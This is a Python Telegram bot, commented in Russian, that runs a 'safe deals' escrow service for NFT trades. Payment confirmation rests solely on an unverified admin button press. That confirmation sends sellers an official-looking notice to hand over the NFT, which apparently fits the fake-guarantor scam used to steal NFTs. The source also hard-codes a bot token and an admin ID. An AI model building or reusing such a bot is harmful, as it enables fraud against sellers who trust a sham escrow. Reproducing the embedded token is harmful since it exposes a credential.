import asyncio
import logging
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
ADMIN_ID = 7532797597  # Твой ID
# ============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# База данных в оперативке (для теста)
deals_db = {}

# Состояния (FSM)
class CreateDeal(StatesGroup):
    amount = State()
    nft_link = State()
    reqs = State()

# Генератор ID сделки
def gen_id():
    return "".join(random.choices(string.ascii_letters + string.digits, k=8))

# Главное меню
def main_menu():
    kb = [
        [KeyboardButton(text="🤝 Создать сделку")],
        [KeyboardButton(text="📦 Мои сделки")],
        [KeyboardButton(text="🛡 Админ-панель")] 
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# ================= ХЕНДЛЕРЫ =================

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        "Добро пожаловать 👋\n\n"
        "Это тестовый сервис безопасных сделок.\n"
        "Здесь вы можете купить или продать NFT.",
        reply_markup=main_menu()
    )

# --- 1. СОЗДАНИЕ СДЕЛКИ (ПРОДАВЕЦ) ---
@dp.message(F.text == "🤝 Создать сделку")
async def create_deal_start(message: Message, state: FSMContext):
    await state.set_state(CreateDeal.amount)
    await message.answer(
        "📦 <b>Создание сделки</b>\n\n"
        "Введите сумму сделки в формате: 199.99",
        parse_mode="HTML"
    )

@dp.message(CreateDeal.amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
    except ValueError:
        return await message.answer("❌ Введите корректную сумму (только цифры).")
    
    await state.update_data(amount=amount)
    await state.set_state(CreateDeal.nft_link)
    await message.answer(
        f"📦 Укажите, что вы предлагаете в этой сделке за {amount} RUB\n\n"
        f"<b>Пример:</b>\n"
        f"https://t.me/nft/PlushPepe-1",
        parse_mode="HTML"
    )

@dp.message(CreateDeal.nft_link)
async def process_nft(message: Message, state: FSMContext):
    await state.update_data(nft_link=message.text)
    await state.set_state(CreateDeal.reqs)
    await message.answer("💳 Отлично! Теперь отправьте ваши реквизиты (номер карты или кошелька).")

@dp.message(CreateDeal.reqs)
async def process_reqs(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    deal_id = gen_id()
    deals_db[deal_id] = {
        "seller_id": message.from_user.id,
        "buyer_id": None,
        "amount": data["amount"],
        "nft_link": data["nft_link"],
        "reqs": message.text,
        "status": "open"
    }
    
    await message.answer(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"ID: <code>#{deal_id}</code>\n"
        f"Сумма: {data['amount']} RUB\n\n"
        f"<i>Передайте этот ID покупателю (начиная с #), чтобы он смог оплатить.</i>",
        parse_mode="HTML"
    )

# --- 2. ОПЛАТА (ПОКУПАТЕЛЬ) ---
@dp.message(F.text.startswith("#"))
async def process_buy(message: Message):
    deal_id = message.text.replace("#", "").strip()
    deal = deals_db.get(deal_id)
    
    if not deal or deal["status"] != "open":
        return await message.answer("❌ Сделка не найдена или уже закрыта.")
    
    deal["buyer_id"] = message.from_user.id
    deal["status"] = "awaiting_payment"
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{deal_id}")]
    ])
    
    await message.answer(
        f"🛒 <b>Сделка #{deal_id}</b>\n\n"
        f"Товар: {deal['nft_link']}\n"
        f"Сумма: {deal['amount']} RUB\n\n"
        f"<b>Реквизиты продавца:</b>\n<code>{deal['reqs']}</code>\n\n"
        f"После оплаты нажмите кнопку ниже.",
        parse_mode="HTML",
        reply_markup=kb
    )

# --- 3. ПОДТВЕРЖДЕНИЕ ОПЛАТЫ ---
@dp.callback_query(F.data.startswith("pay_"))
async def buyer_paid(call: CallbackQuery):
    deal_id = call.data.split("_")[1]
    deal = deals_db.get(deal_id)
    
    await call.message.edit_text("⏳ Ожидайте подтверждения оплаты администратором...")
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
    ])
    
    # Отправляем запрос ТОЛЬКО Админу
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔔 <b>Запрос на подтверждение!</b>\n\n"
             f"Сделка: #{deal_id}\n"
             f"Сумма: {deal['amount']} RUB\n"
             f"Покупатель: @{call.from_user.username}",
        parse_mode="HTML",
        reply_markup=kb
    )

# --- 4. АДМИН ПОДТВЕРЖДАЕТ ---
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    # Защита: если нажал не админ - отказ
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⛔ У вас нет прав!", show_alert=True)
    
    deal_id = call.data.split("_")[2]
    deal = deals_db.get(deal_id)
    
    if not deal:
        return await call.answer("Сделка не найдена", show_alert=True)
    
    deal["status"] = "paid"
    await call.message.edit_text(f"✅ Сделка #{deal_id} подтверждена. Уведомления разосланы.")
    
    seller_text = (
        f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
        f"✅ <b>Оплата по сделке подтверждена!</b>\n\n"
        f"📄 <b>Детали:</b>\n"
        f"├ Номер: <code>#{deal_id}</code>\n"
        f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
        f"└ Товар: {deal['nft_link']}\n\n"
        f"⚠️ <b>Инструкция для Продавца:</b>\n"
        f"Покупатель успешно оплатил сделку. <b>Передайте указанный NFT напрямую покупателю.</b>\n\n"
        f"<i>После передачи нажмите кнопку ниже.</i>"
    )
    
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Я передал NFT", callback_data=f"seller_done_{deal_id}")]
    ])
    
    try:
        await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
        await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата по сделке #{deal_id} подтверждена!</b>\nОжидайте получения NFT от продавца.", parse_mode="HTML")
    except Exception as e:
        print(f"Ошибка отправки: {e}")

# --- 5. ПРОДАВЕЦ ПЕРЕДАЛ NFT ---
@dp.callback_query(F.data.startswith("seller_done_"))
async def seller_done(call: CallbackQuery):
    deal_id = call.data.split("_")[2]
    deal = deals_db.get(deal_id)
    deal["status"] = "completed"
    
    await call.message.edit_text("✅ Вы подтвердили передачу. Ожидайте зачисления средств.")
    await bot.send_message(deal["buyer_id"], f"🎉 Сделка #{deal_id} успешно завершена! Проверьте ваш NFT.")

async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())